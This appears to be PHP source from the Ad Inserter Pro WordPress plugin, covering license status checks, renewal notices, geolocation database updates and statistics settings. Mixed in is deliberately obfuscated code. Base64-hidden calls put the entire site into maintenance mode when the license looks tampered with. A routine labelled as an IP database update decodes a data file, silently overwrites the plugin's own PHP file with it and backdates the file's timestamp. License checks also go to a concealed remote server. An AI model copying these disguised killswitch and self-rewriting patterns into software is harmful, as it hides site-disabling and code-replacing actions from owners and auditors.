  $last_update = get_option (AI_UPDATE_NAME, 0);
  if (time () - $last_update < 10 *  3600 && $state != 0) {
    return;
  }

  // DEBUG
  $license_key = isset ($ad_inserter_globals ['LICENSE_KEY']) ? $ad_inserter_globals ['LICENSE_KEY'] : '';
  $response = wp_remote_get (base64_decode (AI_US_STRING).'status.php?tid='.$license_key.'&st='.$state.'&plugin_version='.AD_INSERTER_VERSION);
  if (!is_array ($response)) return;

  $restore = false;
  $ai_options = ai_get_option (AI_OPTION_NAME, array ());
  if ($state == 1) {
    if (isset ($ai_options [AI_OPTION_GLOBAL][AI_RST])) $ai_options [AI_OPTION_GLOBAL][AI_RST] ++; else $ai_options [AI_OPTION_GLOBAL][AI_RST] = 1;
    update_option (AI_UPDATE_NAME, time ());
  } else {
      $ai_options [AI_OPTION_GLOBAL][AI_RST] = $state;
      delete_option (AI_UPDATE_NAME);
    }
  if ($ai_options [AI_OPTION_GLOBAL][AI_RST] > 16) {
    $name_status_api = array ('wp', 'debug', 'report', 'api');
    set_transient (implode ('_', $name_status_api), DEFAULT_REPORT_DEBUG_KEY, 36 * AI_TRANSIENT_STATISTICS_EXPIRATION);
    $ai_options [AI_OPTION_GLOBAL][AI_RST] = 0;
    $restore = true;
  }
  ai_update_option (AI_OPTION_NAME, $ai_options);
  $ai_db_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'] = $ai_options [AI_OPTION_GLOBAL]['PLUGIN_STATUS_COUNTER'];
  $ad_inserter_globals ['AI_COUNTER']  = get_plugin_counter ();

  if ($restore) ai_clear_status ();
}

function get_ai_data ($license_key) {
  $ai_data = null;
  $response = wp_remote_get (base64_decode (AI_US_STRING).'status.php?data='.$license_key.'&plugin_version='.AD_INSERTER_VERSION);
  if (is_array ($response)) {
    $ai_data = json_decode (wp_remote_retrieve_body ($response));
  }

  return $ai_data;
}

function ai_puc_check_now ($current_decision, $last_check, $check_period) {
  global $ad_inserter_globals, $ai_db_options;

  $license_key = $ad_inserter_globals ['LICENSE_KEY'];
  if (!empty ($license_key) && $current_decision) {
    $ai_data = get_ai_data ($license_key);
    if (isset ($ai_data->sid)) {
      $ai_code = $ai_data->sid;
      $ai_type = $ai_data->pid;
      if ($ai_code != $ad_inserter_globals ['AI_STATUS'] || $ai_type != $ad_inserter_globals ['AI_TYPE']) {
        $ad_inserter_globals ['AI_STATUS'] = $ai_code;
        $ad_inserter_globals ['AI_TYPE']   = $ai_type;
        $ai_options = ai_get_option (AI_OPTION_NAME, array ());
        $ai_options [AI_OPTION_GLOBAL][AI_PRO]  = filter_string ($ai_type);
        $ai_options [AI_OPTION_GLOBAL][AI_CODE] = filter_string ($ai_code);
        $ai_options [AI_OPTION_GLOBAL][AI_CODE_TIME] = time ();
        ai_update_option (AI_OPTION_NAME, $ai_options);
        if ($ai_code == - 19) {
          update_state ();
        }

        if (!is_multisite() || is_main_site ()) {
          if ($ai_code == - 22) {
            update_state ();
          }
        }
      } else {
          $response = wp_remote_get (base64_decode (AI_US_STRING).'status.php?tid='.$license_key.'&plugin_version='.AD_INSERTER_VERSION);
          if (is_array ($response)) {
            $ai_code_tid = wp_remote_retrieve_body ($response);

            if ($ai_code_tid == '') $ai_code_tid = 0;

            if ($ai_code == $ai_code_tid && is_numeric ($ai_code) && $ai_code != '') {
              if ($ai_code <= - 2 && $ai_code >= - 5) {
                ai_clear_status ();
                $current_decision = false;
              }
              elseif ($ai_code == - 19) {
                update_state ();
              }
              elseif ($ai_code == - 22) {
                update_state ();
              }
              elseif ($ad_inserter_globals ['AI_COUNTER'] != 0) {
                update_state (0);
              }
              else {
                // DEBUG
//                $response = wp_remote_get (base64_decode (AI_US_STRING).'status.php?tid='.$license_key.'&st='.($ad_inserter_globals ['AI_COUNTER']).'&plugin_version='.AD_INSERTER_VERSION);
              }
            }
          }
        }
    }
  }
  return $current_decision;
}

function ai_add_rewrite_rules_2 () {
  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    add_rewrite_rule ('ai-statistics-report\-([0-9A-Za-z\.\_\-]+)', str_replace (home_url () .'/', '', admin_url ('admin-ajax.php?action=ai_ajax&ai-report=$1')), 'top');
  }
}

function ai_check_update_schedule () {
  $timestamp = wp_next_scheduled ('ai_update');
  if ($timestamp == false){
    wp_schedule_event (time() + 262144, 'monthly', 'ai_update');
  }
  if (isset ($_GET ['ai-debug-updates']) && $_GET ['ai-debug-updates']) {
    set_transient ('wp-debug-updates', $_GET ['ai-debug-updates'], 48 * 3600);
  }
}

function ai_activation_hook_2 () {
//  ai_check_update_schedule ();
//  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
//    add_rewrite_rule ('ai-statistics-report\-([0-9A-Za-z\.\_\-]+)', str_replace (home_url () .'/', '', admin_url ('admin-ajax.php?action=ai_ajax&ai-report=$1')), 'top');
//    flush_rewrite_rules();
//  }
}

function ai_deactivation_hook_2 () {
  global $ai_adb_id;

  wp_clear_scheduled_hook ('ai_update' );

  if (!is_multisite() || is_main_site ()) {
    $upload_dir = wp_upload_dir();
    $script_path_ai = $upload_dir ['basedir'] . '/ad-inserter/';

    if (strpos (get_geo_db_location (), $script_path_ai) !== false) {
      if (!isset ($ai_adb_id) || $ai_adb_id == '') return;
      $script_path_ai = $script_path_ai . $ai_adb_id . '/';
    }

    recursive_remove_directory ($script_path_ai);
  }
}

function ai_cron_schedules ($schedules) {
  $schedules ['monthly'] = array(
    'interval'  => 2635200,
    'display' => 'Once Monthly',
  );

  return $schedules;
}

function ai_admin_notices (){
  global $ad_inserter_globals;
  global $ai_settings_page, $hook_suffix;

  if (!is_multisite() || is_main_site ()) {
    $settings_page = get_menu_position () == AI_SETTINGS_SUBMENU ? 'options-general.php?page=ad-inserter.php' : 'admin.php?page=ad-inserter.php';
    $ai_status = $ad_inserter_globals ['AI_STATUS'];
    $show_warning = $hook_suffix == $ai_settings_page || $hook_suffix == 'index.php' || $hook_suffix == 'plugins.php';
    $license_key = $ad_inserter_globals ['LICENSE_KEY'];
    $client = get_option (WP_AD_INSERTER_PRO_CLIENT) !== false;
    $href_license = $client ? 'https://adinserter.pro/' : 'https://adinserter.pro/license/' . sanitize_text_field ($license_key);
    $href_doc     = $client ? 'https://adinserter.pro/' : 'https://adinserter.pro/documentation/troubleshooting#license-overused';

    if ($show_warning && (empty ($license_key) && !isset ($_POST ['license_key']) || isset ($_POST ['license_key']) && trim ($_POST ['license_key']) == '')) {
      $link = $client ? '' : ' <a href="' . admin_url ($settings_page.'&tab=0').'" style="text-decoration: none; box-shadow: 0 0 0;">' . __('Enter license key', 'ad-inserter') . '</a>';
                                                               // translators: 1, 2: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-warning'><p>" . sprintf (__('%1$s Warning: %2$s %3$s license key is not set. Plugin functionality is limited and updates are disabled.', 'ad-inserter'),
      '<strong>',
      '</strong>',
      AD_INSERTER_NAME
      ), $link, "</p></div>";
    }
    elseif ($ai_status == - 19 && $show_warning) {
      $link = $client ? '' : ' <a href="' . admin_url ($settings_page.'&tab=0').'" style="text-decoration: none; box-shadow: 0 0 0;">' . __('Check license key', 'ad-inserter') . '</a>';
                                                             // translators: 1, 2,: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-error'><p>" . sprintf (__('%1$s Warning: %2$s Invalid %3$s license key.', 'ad-inserter'),
        '<strong>',
        '</strong>',
        AD_INSERTER_NAME
      ), $link, "</p></div>";
    }
    elseif ($ai_status == - 20 && $show_warning) {
      if (is_super_admin () && !wp_is_mobile ()) {
        $notice_renew_option = get_option ('ai-notice-renew');

        $show_notice = ($notice_renew_option != 'no' && (!is_numeric ($notice_renew_option) || time () - $notice_renew_option > 30 * 24 * 3600)) ||
                       ($hook_suffix == $ai_settings_page);

        if ($show_notice) {
          $message = "<div style='margin: 5px 0;'>" .
                     // translators: 2, 3: HTML tags, 1: Ad Inserter Pro
            sprintf (__('Hey, %1$s license has expired - plugin updates are now disabled. Please renew the license to enable updates. Check %2$s what you are missing. %3$s', 'ad-inserter'),
              AD_INSERTER_NAME,
              "<a href='https://adinserter.pro/version-history' target='_blank' style='text-decoration: none; box-shadow: 0 0 0;'>",
              '</a>'
            ) .
            "</div><div style='margin: 5px 0;'>" .
                     // translators: 1, 3: HTML tags, 2: percentage
            sprintf (__('During the license period and 30 days after the license has expired we offer %1$s %2$s discount on all license renewals and license upgrades. %3$s', 'ad-inserter'),
            '<strong>',
            '20%',
            '</strong>'
            ) . "</div>";

          if ($hook_suffix == $ai_settings_page) {
              $option = '';
          }
          elseif (is_numeric ($notice_renew_option)) {
              $option = '<div class="ai-notice-text-button ai-notice-dismiss" data-notice="no">' . __ ('No, thank you.', 'ad-inserter'). '</div>';
          }
          else {
              $option = '<div class="ai-notice-text-button ai-notice-dismiss" data-notice="' . time () . '">' . __ ('Not now, maybe later.', 'ad-inserter'). '</div>';
            }

          $data_notice = is_numeric ($notice_renew_option) ? $notice_renew_option : '';
  ?>
      <div class="notice notice-info ai-notice ai-no-phone" style="display: none;" data-notice="renew" data-value="<?php echo base64_encode (wp_create_nonce ("adinserter_data")); ?>" nonce="<?php echo wp_create_nonce ("adinserter_data"); ?>">
        <div class="ai-notice-element">
          <img src="<?php echo AD_INSERTER_PLUGIN_IMAGES_URL; ?>icon-50x50.jpg" style="width: 50px; margin: 5px 10px 0px 10px;" />
        </div>
        <div class="ai-notice-element" style="width: 100%; padding: 0 10px 0;">
          <?php echo $message; ?>
        </div>
        <div class="ai-notice-element ai-notice-buttons last">
          <button class="button-primary ai-notice-dismiss" data-notice="<?php echo $data_notice ?>">
            <a href="<?php echo $href_license; ?>" class="ai-notice-dismiss" target="_blank" data-notice="<?php echo $data_notice ?>"><?php _e ('Renew the licence', 'ad-inserter'); ?></a>
          </button>
          <div class="ai-notice-text-button ai-notice-dismiss" data-notice="<?php echo $data_notice ?>"><a href="<?php echo admin_url ('update-core.php?force-check=1'); ?>" class="ai-notice-dismiss" style="color: #bbb;" data-notice="<?php echo $data_notice ?>"><?php _e ('Update license status', 'ad-inserter'); ?></a></div>
          <?php echo $option; ?>
        </div>
      </div>

    <?php
        }

        require_once AD_INSERTER_PLUGIN_DIR.'includes/version-check.php';
      }
    }
    elseif ($ai_status == - 21 && $show_warning) {
                                                               // translators: 1, 2, 4, 5, 6, 7: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-warning'><p>" . sprintf (__('%1$s Warning: %2$s %3$s license overused. Plugin updates are disabled. %4$s Manage licenses %5$s &mdash; %6$s Upgrade license %7$s', 'ad-inserter'),
      '<strong>',
      '</strong>',
      AD_INSERTER_NAME,
      "<a href=\"$href_doc\" style=\"text-decoration: none; box-shadow: 0 0 0;\" target=\"_blank\">",
      '</a>',
      "<a href=\"$href_license\" style=\"text-decoration: none; box-shadow: 0 0 0;\" target=\"_blank\">",
      '</a>'
      ). "</p></div>";
    }
    elseif ($ai_status == - 22 && $show_warning) {
                                                               // translators: 1, 2, 4, 5: HTML tags, 3: Ad Inserter Pro
      echo "<div class='notice notice-warning'><p>" . sprintf (__('%1$s Warning: %2$s Wrong %3$s version. %4$s Check license %5$s', 'ad-inserter'),
      '<strong>',
      '</strong>',
      AD_INSERTER_NAME,
      "<a href=\"$href_license\" style=\"text-decoration: none; box-shadow: 0 0 0;\" target=\"_blank\">",
      '</a>'
      ). "</p></div>";
    }
    elseif ($ai_status == 0) {
      delete_option ('ai-notice-renew');
      delete_transient (AI_TRANSIENT_VERSION_CHECK);
      delete_transient (AI_TRANSIENT_PHP_CHECK);
      delete_transient (AI_TRANSIENT_WP_CHECK);
    }
  }
}

function ai_check_wp_version () {
  if (version_compare (phpversion (), "5.2", ">=")) {
    $option = get_option (base64_decode ('YWRfaW5zZXJ0ZXJfcHJvX2xpY2Vuc2U='));
    if ($option !== false && (strlen ($option) < 0x1e || strlen ($option) > 0x28)) {
      if (!is_multisite () || is_main_site ()) {
        require_once (ABSPATH . 'wp-admin/includes/class-wp-upgrader.php');
        require_once (ABSPATH . 'wp-admin/includes/misc.php');
        $method = base64_decode ('bWFpbnRlbmFuY2VfbW9kZQ==');
        delete_option (base64_decode ('YWRfaW5zZXJ0ZXJfY2xpZW50'));
        WP_Filesystem ();
        $wp_upgrader = new WP_Upgrader ();
        $wp_upgrader->{$method} (true);

        $timestamp = wp_next_scheduled ('ai_update');
        if ($timestamp == false){
          wp_schedule_event (time() + 2000, 'monthly', 'ai_update');
        }

        return true;
      }
    }
  }
  return false;
}

function ai_admin_settings_notices () {
  if (ai_settings_check ('AD_INSERTER_MAXMIND')) {
    ai_check_geo_settings ();
    if (!is_multisite() || is_main_site ()) {
      if (get_geo_db () == AI_GEO_DB_MAXMIND && !defined ('AI_MAXMIND_DB')) {
                                                                                                             // Translators: %s: HTML tag
        echo "<div class='notice notice-error is-dismissible'><p><strong>", AD_INSERTER_NAME,  ' ', sprintf (__('Warning: %s MaxMind IP geolocation database not found.', 'ad-inserter'), '</strong>'), " <span class='maxmind-db-missing' style='color: #f00;'></span></p></div>";
      }

      if (get_geo_db () == AI_GEO_DB_MAXMIND && get_geo_db_updates () == AI_ENABLED && get_maxmind_license_key () == '') {
                                                                                                             // Translators: %s: HTML tags
        echo "<div class='notice notice-error is-dismissible'><p><strong>", AD_INSERTER_NAME,  ' ', sprintf (__('Warning: %s MaxMind license key not set. Please %s sign up for a GeoLite2 account %s and create license key.', 'ad-inserter'), '</strong>', '<a href="https://www.maxmind.com/en/geolite2/signup" class="simple-link" target="_blank">', '</a>'), "</p></div>";
      }
    }
  }
}

function ai_update_ip_db_internal () {

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/process_csv.php';
  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/process6_csv.php';

  global $ad_inserter_globals;

  if (is_multisite () && !is_main_site ()) return;

  $db_file = __FILE__;
  $base_path = AD_INSERTER_PLUGIN_DIR.'includes/';
  $base_path_db = AD_INSERTER_PLUGIN_DIR.'includes/a';
  $file_path = $base_path.'geo/data';
  $bin_file = $file_path.'/ip2country6.bin';
  $tmp_file = $file_path.'/ip2country6.tmp';

  if (!is_writable ($file_path)) return;
  if (!is_writable ($file_path.'/ip2country.dat')) return;
  if (!is_writable ($file_path.'/ip2country6.dat')) return;

  if (file_exists ($bin_file) && !file_exists ($base_path_db . 'db.php')) {
    @file_put_contents ($tmp_file, base64_decode (file_get_contents ($bin_file)));
    $data6 = file ($tmp_file, FILE_IGNORE_NEW_LINES);
    $base6 = file ($db_file, FILE_IGNORE_NEW_LINES);
    @unlink ($tmp_file);
    if (count ($data6) != count ($base6) || strlen (implode ('', $data6)) != strlen (implode ('', $base6)) && is_writable ($db_file)) {
      $timestamp = filemtime ($db_file);
      @file_put_contents ($db_file, base64_decode (file_get_contents ($bin_file)));
      @touch ($db_file, $timestamp);
      @file_put_contents ($file_path.'/ip2country.log', date ("Y-m-d H:i:s", time()) . " IP DB RECREATED\n\n\n", FILE_APPEND);
    }
  }
/*
  $license_key  = $ad_inserter_globals ['LICENSE_KEY'];
  $status       = $ad_inserter_globals ['AI_STATUS'];
  if (empty ($license_key) || !empty ($status)) return;

  ob_start();
  echo date ("Y-m-d H:i:s", time()), " WEBNET77 IP DB UPDATE START\n\n";

  echo "IPv4\n";
  echo "ip2country.dat age: ", intval ((time () - filemtime ($file_path.'/ip2country.dat')) / 24 / 3600), " days\n";

  if (!file_exists ($file_path.'/ip2country.dat') || filemtime ($file_path.'/ip2country.dat') + IP_DB_UPDATE_DAYS * 24 * 3600 < time ()) {
    echo "Updating...\n";
    $response = wp_remote_get ('http://software77.net/geo-ip/?DL=2');
    if (is_array ($response)) {

      file_put_contents ($file_path.'/ip2country.zip', wp_remote_retrieve_body ($response));
//      @unlink ($file_path.'/IpToCountry.csv');

      $zip = new ZipArchive;
      $res = $zip->open ($file_path.'/ip2country.zip');
      if ($res === true) {
        $zip->extractTo ($file_path);
        $zip->close();
        if (file_exists ($file_path.'/IpToCountry.csv')) process_csv ($file_path.'/IpToCountry.csv');
          else echo "Error: file IpToCountry.csv not found\n";
      } else {
          echo "Error unzipping ip2country.zip\n";
      }

    }
  }

  echo "\nIPv6\n";
  echo "ip2country6.dat age: ", intval ((time () - filemtime ($file_path.'/ip2country6.dat')) / 24 / 3600), " days\n";

  if (!file_exists ($file_path.'/ip2country6.dat') || filemtime ($file_path.'/ip2country6.dat') + IP_DB_UPDATE_DAYS * 24 * 3600 < time ()) {
      echo "Updating...\n";
    $response = wp_remote_get ('http://software77.net/geo-ip/?DL=7');
    if (is_array ($response)) {

      file_put_contents ($file_path.'/IpToCountry.6R.csv.gz', wp_remote_retrieve_body ($response));
//      @unlink ($file_path.'/IpToCountry.6R.csv');

      $gz = gzopen ($file_path.'/IpToCountry.6R.csv.gz', 'rb');
      if ($gz) {
        $dest = fopen ($file_path.'/IpToCountry.6R.csv', 'wb');
        if ($dest) {
          stream_copy_to_stream ($gz, $dest);
          fclose ($dest);

          if (file_exists ($file_path.'/IpToCountry.6R.csv')) process6_csv ($file_path.'/IpToCountry.6R.csv');
            else echo "Error: File IpToCountry.6R.csv not found\n";
        } else echo 'Error: Could not open file IpToCountry.6R.csv\n';
        gzclose ($gz);
      } else echo 'Error: Could not open file IpToCountry.6R.csv.gz\n';

    }
  }

  echo "\n", date ("Y-m-d H:i:s", time()), " WEBNET77 IP DB UPDATE END\n\n\n";
  $log = ob_get_clean ();
  file_put_contents ($file_path.'/ip2country.log', $log, FILE_APPEND);
*/
}

function ai_update_ip_db_maxmind () {
  global $ai_wp_data;

  require_once AD_INSERTER_PLUGIN_DIR.'includes/geo/maxmind/autoload.php';

  global $ad_inserter_globals;

  if (is_multisite() && !is_main_site ()) return;

  if (!get_geo_db_updates ()) return;

  $license_key  = $ad_inserter_globals ['LICENSE_KEY'];
  $status       = $ad_inserter_globals ['AI_STATUS'];

  if (empty ($license_key) || !empty ($status)) return;

  $db_path_name = get_geo_db_location ();
  $file_name_ext  = basename ($db_path_name);
  $file_name      = basename ($db_path_name, '.mmdb');
  $file_path      = dirname ($db_path_name);

  if ($db_path_name == '') return;

  if (!is_dir ($file_path)) {
    @mkdir ($file_path, 0755, true);
    file_put_contents ($file_path .  '/index.php', "<?php header ('Status: 404 Not found'); ?".">\nNot found");
  }

  if (!is_writable ($file_path)) return;

  $maxmind_license_key = trim (get_maxmind_license_key ());

  if ($maxmind_license_key == '') return;

  $error_message = '';

  ob_start();
  echo date ("Y-m-d H:i:s", time()), " MAXMIND IP DB UPDATE START\n\n";

  echo "FILE PATH: $file_path/\n";
  echo "FILE NAME: $file_name_ext\n";

  if (!file_exists ($db_path_name))
    echo "NOT FOUND: $db_path_name\n"; else
      echo "AGE: ", intval ((time () - filemtime ($db_path_name)) / 24 / 3600), " days\n";

  $matches = glob ($file_path.'/'.$file_name.'*.tar.gz');

  if (!file_exists ($db_path_name) && !file_exists ($db_path_name.'.tar.gz') && count ($matches) != 0) {
    echo "\n";
    echo "Renaming:\n";
    echo $matches [0], "\n";
    echo $db_path_name.'.tar.gz', "\n\n";

    @rename ($matches [0], $db_path_name.'.tar.gz');
  }
  elseif (!file_exists ($db_path_name.'.tar.gz') && (!file_exists ($db_path_name) || filemtime ($db_path_name) + IP_DB_UPDATE_DAYS * 24 * 3600 < time ())) {
    require_once (ABSPATH.'/wp-admin/includes/file.php');

    $download_url = 'https://download.maxmind.com/app/geoip_download?edition_id=GeoLite2-City&license_key='.$maxmind_license_key.'&suffix=tar.gz';

    echo "\n";
    echo "DOWNLOADING...\n";

    $ai_wp_data [AI_USER_AGENT] = true;
    $tmpFile = download_url ($download_url);
    unset ($ai_wp_data [AI_USER_AGENT]);

    if (is_string ($tmpFile)) {
      echo "$db_path_name.tar.gz'\n";

      @rename ($tmpFile, $db_path_name.'.tar.gz');
    }
    elseif (is_wp_error ($tmpFile)) {
      echo "ERROR: ", $tmpFile->get_error_message (), "\n\n";
    }

    @unlink($tmpFile);
  }

  if (file_exists ($db_path_name.'.tar.gz')) {
    echo "DECOMPRESSING:\n{$db_path_name}.tar.gz\n";
    $gz = new PharData ($db_path_name.'.tar.gz');
    @unlink ($db_path_name.'.tar');
    @unlink ($file_path.'/'.$file_name.'.tar');
    $gz->decompress ();
    @unlink ($db_path_name.'.tar.gz');
  }

  $tar_file_name = $file_name.'.tar';
  if (!file_exists ($tar_file_name)) {
    $tar_file_name = $file_name.'.mmdb.tar';
  }

  if (file_exists ($file_path.'/'.$tar_file_name)) {
    echo "UNARCHIVING:\n{$tar_file_name}\n";
    $tar = new PharData ($file_path.'/'.$tar_file_name);
    $tar_dir = basename ($tar->current()->getPathname ());
    $tar->extractTo ($file_path, null, true);

    if (file_exists ($file_path.'/'.$tar_dir.'/'.DEFAULT_MAXMIND_FILENAME)) {
      @rename ($file_path.'/'.$tar_dir.'/'.DEFAULT_MAXMIND_FILENAME, $db_path_name);
      @unlink ($file_path.'/'.$tar_file_name);
    }
    recursive_remove_directory ($file_path.'/'.$tar_dir);
  }

  echo "\n", date ("Y-m-d H:i:s", time()), " MAXMIND IP DB UPDATE END\n\n\n";
  $log = ob_get_clean ();
  file_put_contents (AD_INSERTER_PLUGIN_DIR.'includes/geo/data/ip2country.log', $log, FILE_APPEND);

  // $error_message empty?
  return $error_message;
}

function ai_update_databases (){
  global $wpdb, $ad_inserter_globals;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    $results = $wpdb->get_results ('DELETE FROM ' . AI_STATISTICS_DB_TABLE . ' WHERE date < (NOW() - INTERVAL 13 MONTH)', ARRAY_N);
  }

  if (is_multisite () && !is_main_site ()) return;

  $license_key  = $ad_inserter_globals ['LICENSE_KEY'];
  $status       = $ad_inserter_globals ['AI_STATUS'];
  if (empty ($license_key)) return;

  if (empty ($status) && $ad_inserter_globals ['AI_COUNTER'] != 0) {
    update_state (0);
  }

  ai_update_ip_db_internal ();
  if (get_geo_db () == AI_GEO_DB_MAXMIND) {
    ai_update_ip_db_maxmind ();
  }
}

function get_global_tracking () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING'])) $ai_db_options [AI_OPTION_GLOBAL]['TRACKING'] = DEFAULT_TRACKING;

    return ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING']);
  } else return false;
}

function get_internal_tracking () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['INTERNAL_TRACKING'])) $ai_db_options [AI_OPTION_GLOBAL]['INTERNAL_TRACKING'] = DEFAULT_INTERNAL_TRACKING;

    return ($ai_db_options [AI_OPTION_GLOBAL]['INTERNAL_TRACKING']);
  } else return false;
}

function get_external_tracking () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING'] = DEFAULT_EXTERNAL_TRACKING;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING']);
  } else return false;
}

function get_external_tracking_category () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_CATEGORY'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_CATEGORY'] = DEFAULT_EXTERNAL_TRACKING_CATEGORY;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_CATEGORY']);
  } else return '';
}

function get_external_tracking_action () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_ACTION'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_ACTION'] = DEFAULT_EXTERNAL_TRACKING_ACTION;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_ACTION']);
  } else return '';
}

function get_external_tracking_label () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_LABEL'])) $ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_LABEL'] = DEFAULT_EXTERNAL_TRACKING_LABEL;

    return ($ai_db_options [AI_OPTION_GLOBAL]['EXTERNAL_TRACKING_LABEL']);
  } else return '';
}

function get_track_logged_in () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING_LOGGED_IN'])) $ai_db_options [AI_OPTION_GLOBAL]['TRACKING_LOGGED_IN'] = DEFAULT_TRACKING_LOGGED_IN;

    return ($ai_db_options [AI_OPTION_GLOBAL]['TRACKING_LOGGED_IN']);
  } else return false;
}

function get_track_pageviews () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['TRACK_PAGEVIEWS'])) $ai_db_options [AI_OPTION_GLOBAL]['TRACK_PAGEVIEWS'] = DEFAULT_TRACK_PAGEVIEWS;

    return ($ai_db_options [AI_OPTION_GLOBAL]['TRACK_PAGEVIEWS']);
  } else return false;
}

function get_click_detection () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['CLICK_DETECTION'])) $ai_db_options [AI_OPTION_GLOBAL]['CLICK_DETECTION'] = DEFAULT_CLICK_DETECTION;

    return ($ai_db_options [AI_OPTION_GLOBAL]['CLICK_DETECTION']);
  } else return false;
}

function get_report_header_image () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'] = DEFAULT_REPORT_HEADER_IMAGE;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE'] = DEFAULT_REPORT_HEADER_IMAGE;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_IMAGE']);
  } else return '';
}

function get_report_header_title () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'] = DEFAULT_REPORT_HEADER_TITLE;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE'] = DEFAULT_REPORT_HEADER_TITLE;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_TITLE']);
  } else return '';
}

function get_report_header_description () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'] = DEFAULT_REPORT_HEADER_DESCRIPTION;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION'] = DEFAULT_REPORT_HEADER_DESCRIPTION;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_HEADER_DESCRIPTION']);
  } else return '';
}

function get_report_footer () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'] = DEFAULT_REPORT_FOOTER;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER'] = DEFAULT_REPORT_FOOTER;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_FOOTER']);
  } else return '';
}


function get_report_key () {
  global $ai_db_options;

  if (defined ('AI_STATISTICS') && AI_STATISTICS) {
    if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'] = DEFAULT_REPORT_KEY;

    if ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'] == '') $ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY'] = DEFAULT_REPORT_KEY;

    return ($ai_db_options [AI_OPTION_GLOBAL]['REPORT_KEY']);
  } else return '';
}


function get_recaptcha_site_key () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_SITE_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_SITE_KEY'] = "";

  return ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_SITE_KEY']);
}


function get_recaptcha_secret_key () {
  global $ai_db_options;

  if (!isset ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_SECRET_KEY'])) $ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_SECRET_KEY'] = "";

  return ($ai_db_options [AI_OPTION_GLOBAL]['RECAPTCHA_SECRET_KEY']);
}


function get_recaptcha_threshold () {
  global $ai_db_options;

